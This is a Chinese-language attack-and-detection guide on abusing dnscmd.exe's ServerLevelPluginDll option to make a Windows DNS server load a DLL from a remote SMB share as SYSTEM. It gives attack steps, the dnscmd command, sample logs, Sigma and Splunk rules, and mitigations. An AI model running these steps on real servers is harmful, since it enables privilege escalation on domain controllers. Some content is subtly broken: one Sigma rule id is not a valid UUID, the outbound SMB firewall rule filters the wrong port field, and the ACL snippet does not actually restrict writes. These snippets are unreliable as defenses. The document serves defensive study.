# T1543-003-Win-Windows服务Dnscmd.exe持久化

## 描述

攻击者可能通过创建或修改Windows服务实现恶意代码的持久化执行（T1543.003）。Windows服务是在系统启动时运行的后台程序，负责核心系统功能，其配置信息（如可执行文件路径）存储在Windows注册表中。攻击者可通过工具（如`sc.exe`、`reg.exe`）或直接与Windows API交互，安装新服务或修改现有服务以执行恶意负载。

**Dnscmd.exe**是Windows提供的DNS服务器管理命令行工具，位于`C:\Windows\System32\`和`C:\Windows\SysWOW64\`，用于自动化DNS管理任务。攻击者可滥用`dnscmd.exe`的`/serverlevelplugindll`参数，将恶意DLL注册为DNS服务插件，在DNS服务器重启后以SYSTEM权限执行，结合伪装为合法DNS操作，隐蔽性较高。攻击者需具备DnsAdmins组权限（或等效权限）才能执行此操作。检测重点在于监控`dnscmd.exe`的异常命令行参数及相关注册表修改。

## 测试案例

1. **通过Dnscmd注册恶意DLL**  
   攻击者使用`dnscmd.exe`将远程恶意DLL注册为DNS服务插件，在DNS服务器重启后执行。  
2. **伪装合法DNS管理操作**  
   攻击者伪装为DNS管理员，使用`dnscmd.exe`执行看似正常的配置命令，隐藏恶意意图。  

### 示例命令
```bash
dnscmd.exe dc1.lab.int /config /serverlevelplugindll \\192.168.0.149\dll\wtf.dll
```
- **用例**：远程向DNS服务器注入DLL。  
- **所需权限**：DnsAdmins组成员或更高权限。  
- **操作系统**：Windows Server（DNS角色）。  

## 检测日志

**Windows安全日志**  
- **事件ID 4688**：记录进程创建，包含`dnscmd.exe`的命令行参数。  
- **事件ID 4674**：记录权限分配，检测DnsAdmins组权限使用。  

**Sysmon日志**  
- **事件ID 1**：记录进程创建，包含`dnscmd.exe`的命令行参数和父进程信息。  
- **事件ID 13**：记录注册表修改，如`HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ServerLevelPluginDll`的更改。  
- **事件ID 3**：记录网络连接，检测远程DLL加载（如`\\192.168.0.149\dll\wtf.dll`）。  

**配置日志记录**  
- 启用进程创建审核：`计算机配置 > 策略 > Windows设置 > 安全设置 > 高级审核策略配置 > 详细跟踪 > 审核进程创建`。  
- 启用命令行参数记录：`计算机配置 > 管理模板 > 系统 > 审核进程创建 > 在进程创建事件中加入命令行 > 启用`。  
- 启用注册表审核：`计算机配置 > 策略 > Windows设置 > 安全设置 > 高级审核策略配置 > 对象访问 > 审核注册表`。  
- 部署Sysmon以增强进程、注册表和网络监控。

## 测试复现

### 环境准备
- **靶机**：Windows Server 2012+，配置DNS服务器角色，域控（DC）或独立DNS服务器。  
- **权限**：DnsAdmins组成员或管理员权限。  
- **工具**：`dnscmd.exe`（系统自带）、测试用DLL文件、Sysmon、Windows安全日志。  
- **网络**：可访问的远程共享路径（如`\\192.168.0.149\dll\`）。  
- **测试DLL路径**：`\\192.168.0.149\dll\test.dll`（模拟恶意DLL）。  

### 攻击步骤
1. **确认权限**  
   - 验证当前用户是否为DnsAdmins组成员：
     ```powershell
     net group "DnsAdmins" /domain
     ```

2. **注册恶意DLL**  
   - 使用`dnscmd.exe`配置DNS服务插件：
     ```bash
     dnscmd.exe dc1.lab.int /config /serverlevelplugindll \\192.168.0.149\dll\test.dll
     ```

3. **触发执行**  
   - 重启DNS服务以加载DLL：
     ```powershell
     Restart-Service -Name DNS
     ```

4. **验证结果**  
   - 检查注册表键：
     ```powershell
     Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters" -Name ServerLevelPluginDll
     ```
   - 检查日志：  
     - **Windows安全日志（事件ID 4688）**：
       ```plaintext
       EventID: 4688
       New Process Name: C:\Windows\System32\dnscmd.exe
       Process Command Line: dnscmd.exe dc1.lab.int /config /serverlevelplugindll \\192.168.0.149\dll\test.dll
       Creator Process Name: C:\Windows\System32\cmd.exe
       ```
     - **Sysmon日志（事件ID 13）**：
       ```plaintext
       EventID: 13
       EventType: SetValue
       TargetObject: HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ServerLevelPluginDll
       Details: \\192.168.0.149\dll\test.dll
       Image: C:\Windows\System32\dnscmd.exe
       User: LAB\DnsAdmin
       ```

5. **清理（测试后）**  
   - 删除注册表键：
     ```powershell
     Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters" -Name ServerLevelPluginDll
     ```
   - 重启DNS服务：
     ```powershell
     Restart-Service -Name DNS
     ```

**注意**：此复现仅用于学习和测试目的，需在合法授权的测试环境中进行，切勿用于非法活动。

## 测试留痕

- **Windows安全日志（事件ID 4688）**：
  ```plaintext
  EventID: 4688
  New Process ID: 0x1234
  New Process Name: C:\Windows\System32\dnscmd.exe
  Process Command Line: dnscmd.exe dc1.lab.int /config /serverlevelplugindll \\192.168.0.149\dll\test.dll
  Creator Process Name: C:\Windows\System32\cmd.exe
  Subject User Name: DnsAdmin
  Subject Domain Name: LAB
  ```

- **Sysmon日志（事件ID 1）**：
  ```plaintext
  EventID: 1
  UtcTime: 2025-06-10 03:00:00.123
  ProcessGuid: {12345678-abcd-1234-abcd-1234567890ab}
  ProcessId: 1234
  Image: C:\Windows\System32\dnscmd.exe
  CommandLine: dnscmd.exe dc1.lab.int /config /serverlevelplugindll \\192.168.0.149\dll\test.dll
  ParentImage: C:\Windows\System32\cmd.exe
  User: LAB\DnsAdmin
  IntegrityLevel: High
  ```

- **Sysmon日志（事件ID 13）**：
  ```plaintext
  EventID: 13
  EventType: SetValue
  UtcTime: 2025-06-10 03:00:00.234
  ProcessGuid: {12345678-abcd-1234-abcd-1234567890ab}
  ProcessId: 1234
  Image: C:\Windows\System32\dnscmd.exe
  TargetObject: HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ServerLevelPluginDll
  Details: \\192.168.0.149\dll\test.dll
  User: LAB\DnsAdmin
  ```

- **Sysmon日志（事件ID 3，远程DLL加载）**：
  ```plaintext
  EventID: 3
  Image: C:\Windows\System32\svchost.exe
  DestinationIp: 192.168.0.149
  DestinationPort: 445
  Protocol: tcp
  User: NT AUTHORITY\SYSTEM
  ```

## 检测规则/思路

**检测规则**  
通过分析Windows安全日志和Sysmon日志，检测`dnscmd.exe`的异常使用及DNS服务注册表修改。以下是具体思路：

1. **日志分析**：
   - 监控事件ID 4688或Sysmon事件ID 1，检测`dnscmd.exe`执行，并检查命令行参数是否包含`/config`和`/serverlevelplugindll`。  
   - 监控Sysmon事件ID 13，检测`HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ServerLevelPluginDll`的修改。  
   - 监控Sysmon事件ID 3，检测DNS服务器访问远程共享路径（如`\\192.168.0.149`）。  
   - 监控事件ID 4674，检测DnsAdmins组权限的使用。  

2. **Sigma规则（DNS ServerLevelPluginDll安装）**：
   ```yaml
   title: DNS ServerLevelPluginDll安装检测
   id: f63b56ee-3f79-4b8a-97fb-5c48007e8573
   status: stable
   description: 检测通过dnscmd.exe注册DNS服务插件DLL的行为，可能用于持久化或权限提升
   author: Florian Roth
   date: 2017/05/08
   references:
     - https://attack.mitre.org/techniques/T1543/003/
     - https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83
     - https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd
   tags:
     - attack.persistence
     - attack.t1543.003
     - attack.privilege_escalation
     - attack.t1112
   logsource:
     category: process_creation
     product: windows
   detection:
     selection:
       Image|endswith: '\dnscmd.exe'
       CommandLine|contains|all:
         - '/config'
         - '/serverlevelplugindll'
     condition: selection
   fields:
     - Image
     - CommandLine
     - ParentCommandLine
     - User
   falsepositives:
     - 合法DNS管理员配置DNS插件
   level: high
   ```

3. **Sigma规则（DNS注册表修改）**：
   ```yaml
   title: DNS服务注册表插件DLL修改
   id: g78901234-abcd567890-xyz123456789
   status: experimental
   description: 检测DNS服务注册表中ServerLevelPluginDll键的修改，可能与恶意DLL注册相关
   logsource:
     product: windows
     service: sysmon
   detection:
     selection:
       EventID: 13
       TargetObject|endswith: '\Services\DNS\Parameters\ServerLevelPluginDll'
     condition: selection
   fields:
     - TargetObject
     - Details
     - Image
     - User
   falsepositives:
     - 合法DNS配置变更
   level: high
   ```

4. **SIEM规则**：
   - 检测`dnscmd.exe`使用及注册表修改。
   - 示例Splunk查询：
     ```spl
     (source="WinEventLog:Microsoft-Windows-Sysmon/Operational" (EventID=1 Image="*dnscmd.exe" CommandLine IN ("*/config*","*/serverlevelplugindll*")) OR (EventID=13 TargetObject="*Services\DNS\Parameters\ServerLevelPluginDll")) | stats count by Image, CommandLine, TargetObject, User, ComputerName
     ```

5. **注册表监控**：
   - 检查DNS服务插件配置：
     ```powershell
     Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters" -Name ServerLevelPluginDll -ErrorAction SilentlyContinue
     ```

6. **威胁情报整合**：
   - 检查DLL文件哈希或远程共享路径是否与已知恶意样本相关，结合威胁情报平台（如VirusTotal、AlienVault）。  

## 建议

### 缓解措施

防御`dnscmd.exe`滥用需从权限管理、注册表保护和监控入手：

1. **限制DnsAdmins权限**  
   - 最小化DnsAdmins组成员，仅授予必要用户：
     ```powershell
     Remove-ADGroupMember -Identity "DnsAdmins" -Members "UnnecessaryUser"
     ```

2. **锁定注册表键**  
   - 限制`HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters`的写权限：
     ```powershell
     $acl = Get-Acl "HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters"
     $acl.SetAccessRuleProtection($true, $false)
     Set-Acl -Path "HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters" -AclObject $acl
     ```

3. **限制远程文件访问**  
   - 禁用DNS服务器对非可信共享路径的访问：
     ```powershell
     New-NetFirewallRule -DisplayName "Block SMB Outbound" -Direction Outbound -Protocol TCP -LocalPort 445 -Action Block
     ```

4. **加强DNS服务安全**  
   - 禁用不必要的DNS插件功能。  
   - 定期审计DNS服务配置：
     ```powershell
     Get-Service -Name DNS | Select-Object Status, StartType
     ```

5. **日志和监控**  
   - 启用Sysmon事件ID 1、13、3，检测`dnscmd.exe`执行和注册表修改。  
   - 配置SIEM监控DNS服务相关事件。  
   - 使用EDR工具检测DNS服务器异常行为。  

6. **定期审计**  
   - 检查DNS服务插件注册表键：
     ```powershell
     Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters" -Name ServerLevelPluginDll -ErrorAction SilentlyContinue
     ```
   - 审计DnsAdmins组成员：
     ```powershell
     Get-ADGroupMember -Identity "DnsAdmins"
     ```

## 参考推荐

- MITRE ATT&CK: T1543.003  
  <https://attack.mitre.org/techniques/T1543/003/>  
- Dnscmd.exe LOLBAS  
  <https://lolbas-project.github.io/lolbas/Binaries/Dnscmd/>  
- Sigma规则：DNS ServerLevelPluginDll  
  <https://github.com/SigmaHQ/sigma/blob/b08b3e2b0d5111c637dbede1381b07cb79f8c2eb/rules/windows/process_creation/process_creation_dns_serverlevelplugindll.yml>  
- DnsAdmin提权分析  
  <https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83>  
- Microsoft Dnscmd文档  
  <https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd>